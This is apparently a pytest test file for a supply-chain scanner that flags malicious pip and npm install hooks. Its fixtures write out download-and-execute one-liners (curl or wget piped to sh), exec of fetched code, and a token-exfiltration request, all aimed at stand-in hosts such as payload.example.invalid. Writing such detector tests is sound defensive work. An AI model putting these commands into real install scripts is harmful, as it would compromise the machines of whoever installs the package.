"""install_hooks: code that runs during pip/npm install."""

from helpers import fired, npm_pkg, py_pkg, rules, weight_of

from tripwire.analyzers.install_hooks import InstallHooksAnalyzer, _is_known_host

A = InstallHooksAnalyzer()

SETUP_HEAD = "from setuptools import setup\nfrom setuptools.command.install import install\n"


def setup_with_run(body: str, imports: str = "") -> str:
    lines = "\n".join("        " + b for b in body.strip().splitlines())
    return (SETUP_HEAD + imports + "\n\nclass Post(install):\n    def run(self):\n        install.run(self)\n"
            + lines + '\n\nsetup(name="x", cmdclass={"install": Post})\n')


# ----------------------------------------------------------- Python: true positives

def test_install_override_with_network_call():
    pkg = py_pkg({"setup.py": setup_with_run('urlopen("https://exfil.example.invalid/c")',
                                             "from urllib.request import urlopen\n")})
    ev = A.analyze(pkg)
    assert "install_network" in fired(ev)
    assert "custom_install_command" in rules(ev)
    assert weight_of(ev, "custom_install_command") < 0.3  # an override alone is context, not a signal


def test_curl_pipe_sh_from_setup_is_download_exec():
    pkg = py_pkg({"setup.py": setup_with_run('os.system("curl -s https://payload.example.invalid | sh")',
                                             "import os\n")})
    ev = A.analyze(pkg)
    assert weight_of(ev, "install_download_exec") >= 0.75


def test_generic_process_at_install_is_medium():
    pkg = py_pkg({"setup.py": "import subprocess\nsubprocess.Popen(['whoami'])\n"})
    ev = A.analyze(pkg)
    assert weight_of(ev, "install_process") == 0.35


def test_import_alias_is_resolved():
    pkg = py_pkg({"setup.py": "import subprocess as sp\nsp.check_output('wget http://payload.example.invalid/x', shell=True)\n"})
    assert "install_download_exec" in fired(A.analyze(pkg))


def test_dunder_import_is_resolved():
    pkg = py_pkg({"setup.py": '__import__("os").system("certutil -urlcache -f http://192.0.2.7/a a")\n'})
    assert "install_download_exec" in fired(A.analyze(pkg))


def test_exec_of_downloaded_code():
    pkg = py_pkg({"setup.py": "from urllib.request import urlopen\n"
                              "exec(urlopen('https://stage.example.invalid/p').read())\n"})
    assert {"install_exec", "install_network"} <= fired(A.analyze(pkg))


def test_local_module_imported_by_setup_is_checked():
    pkg = py_pkg({
        "setup.py": "import _helper\nfrom setuptools import setup\nsetup(name='x')\n",
        "_helper.py": "import requests\nrequests.post('https://exfil.example.invalid', data='FAKE_TOKEN')\n",
    })
    assert "_helper.py" in pkg.install_files
    ev = A.analyze(pkg)
    assert any(e.rule == "install_network" and e.file == "_helper.py" for e in ev)


def test_unparsable_setup_falls_back_to_patterns():
    pkg = py_pkg({"setup.py": "def broken(:\nurlopen('https://exfil.example.invalid')\n"})
    ev = A.analyze(pkg)
    assert "install_network" in fired(ev)
    assert "does not parse" in ev[0].message


def test_pth_with_exec_is_strong():
    pkg = py_pkg({"zz.pth": 'import os; exec(os.environ.get("FIXTURE", "pass"))\n'})
    assert weight_of(A.analyze(pkg), "pth_exec") == 0.8


def test_pth_plain_import_is_weak_but_fires():
    pkg = py_pkg({"zz.pth": "import sitecustomize_helper\n"})
    assert weight_of(A.analyze(pkg), "pth_import") == 0.3


def test_pth_with_only_paths_is_ignored():
    pkg = py_pkg({"paths.pth": "/opt/lib/python\nsrc\n"})
    assert A.analyze(pkg) == []


# ----------------------------------------------------------- Python: benign near-misses

def test_build_ext_running_cmake_is_only_context():
    pkg = py_pkg({"setup.py": """import subprocess
from setuptools import setup
from setuptools.command.build_ext import build_ext

class B(build_ext):
    def run(self):
        subprocess.check_call(["cmake", "--build", "build"])
        super().run()

setup(name="x", cmdclass={"build_ext": B})
"""})
    ev = A.analyze(pkg)
    assert fired(ev) == set()
    assert {"custom_install_command", "install_build_tool"} <= rules(ev)


def test_sys_executable_is_build_tool():
    pkg = py_pkg({"setup.py": "import subprocess, sys\nsubprocess.check_call([sys.executable, '-m', 'pip', '--version'])\n"})
    assert fired(A.analyze(pkg)) == set()


def test_exec_open_read_version_idiom_is_ignored():
    pkg = py_pkg({"setup.py": "about = {}\nexec(open('pkg/__about__.py').read(), about)\n"})
    assert A.analyze(pkg) == []


def test_runtime_code_is_not_install_time():
    # os.system in a normal module is not this analyser's business
    pkg = py_pkg({"pkg/cli.py": "import os\nos.system('curl https://example.com | sh')\n"})
    assert A.analyze(pkg) == []


def test_setup_reading_readme_is_clean():
    pkg = py_pkg({"setup.py": "from pathlib import Path\nfrom setuptools import setup\n"
                              "setup(name='x', long_description=Path('README.md').read_text())\n"})
    assert A.analyze(pkg) == []


# ----------------------------------------------------------------- npm

def test_npm_preinstall_downloader():
    ev = A.analyze(npm_pkg({"preinstall": "wget -q -O- http://payload.example.invalid/i.sh | sh"}))
    assert weight_of(ev, "npm_hook_download_exec") == 0.8
    assert ev[0].line is not None and "preinstall" in ev[0].snippet


def test_npm_inline_node_e_is_checked_as_code():
    cmd = "node -e \"require('child_process').exec('curl -s https://payload.example.invalid | sh')\""
    ev = A.analyze(npm_pkg({"postinstall": cmd}))
    # the shell-dropper check on the whole command wins first
    assert "npm_hook_download_exec" in fired(ev)


def test_npm_inline_node_e_without_shell_words():
    ev = A.analyze(npm_pkg({"postinstall": "node -e \"require('https').get('https://x.example.invalid')\""}))
    assert {"npm_hook_inline_code", "install_network"} <= fired(ev)


def test_npm_hook_file_is_followed():
    pkg = npm_pkg({"postinstall": "node ./scripts/install.js"}, {
        "scripts/install.js": 'const { exec } = require("child_process");\nexec("powershell -c FAKE");\n'})
    assert "scripts/install.js" in pkg.install_files
    ev = A.analyze(pkg)
    assert {"install_process", "install_download_exec"} <= fired(ev)
    assert weight_of(ev, "npm_hook_runs_file") == 0.2


def test_npm_shell_script_hook_is_read():
    pkg = npm_pkg({"install": "sh ./scripts/setup.sh"},
                  {"scripts/setup.sh": "#!/bin/sh\ncurl -fsSL https://payload.example.invalid | bash\n"})
    ev = A.analyze(pkg)
    assert any(e.rule == "install_download_exec" and e.file == "scripts/setup.sh" for e in ev)


def test_npm_unknown_hook_command_is_context():
    ev = A.analyze(npm_pkg({"postinstall": "make all"}))
    assert rules(ev) == {"npm_hook_other"} and fired(ev) == set()


def test_npm_network_to_unknown_host():
    pkg = npm_pkg({"postinstall": "node i.js"}, {"i.js": 'require("https").get("https://cdn.example.invalid/x");\n'})
    assert "install_network" in fired(A.analyze(pkg))


# ----------------------------------------------------------------- npm: benign near-misses

def test_node_gyp_rebuild_is_benign():
    ev = A.analyze(npm_pkg({"install": "node-gyp rebuild"}))
    assert rules(ev) == {"npm_hook_build"} and fired(ev) == set()


def test_implicit_node_gyp_from_binding_gyp():
    pkg = npm_pkg(files={"binding.gyp": '{"targets": []}'})
    assert pkg.install_scripts == {"install": "node-gyp rebuild"}
    ev = A.analyze(pkg)
    assert rules(ev) == {"npm_hook_build"}


def test_husky_install_is_benign():
    assert fired(A.analyze(npm_pkg({"postinstall": "husky install"}))) == set()


def test_prebuilt_binary_from_github_is_low():
    pkg = npm_pkg({"postinstall": "node install.js"}, {"install.js": (
        'const https = require("https");\n'
        'https.get("https://github.com/example/tool/releases/download/v1/tool.tgz");\n')})
    ev = A.analyze(pkg)
    assert "install_network_known_host" in rules(ev)
    assert "install_network" not in rules(ev)
    assert fired(ev) == set()


def test_lookalike_known_host_is_not_trusted():
    # bug fix: "evilgithub.com".endswith("github.com") used to count as GitHub
    pkg = npm_pkg({"postinstall": "node install.js"}, {"install.js": (
        'const https = require("https");\nhttps.get("https://evilgithub.com/x.tgz");\n')})
    assert "install_network" in fired(A.analyze(pkg))


def test_known_host_helper():
    assert _is_known_host("github.com")
    assert _is_known_host("objects.githubusercontent.com")
    assert _is_known_host("api.github.com")
    assert not _is_known_host("evilgithub.com")
    assert not _is_known_host("github.com.example.invalid")


def test_no_scripts_no_findings():
    assert A.analyze(npm_pkg(files={"index.js": "module.exports = 1;\n"})) == []


def test_runtime_child_process_in_npm_is_ignored():
    pkg = npm_pkg(files={"index.js": 'const cp = require("child_process");\ncp.execSync("git status");\n'})
    assert A.analyze(pkg) == []
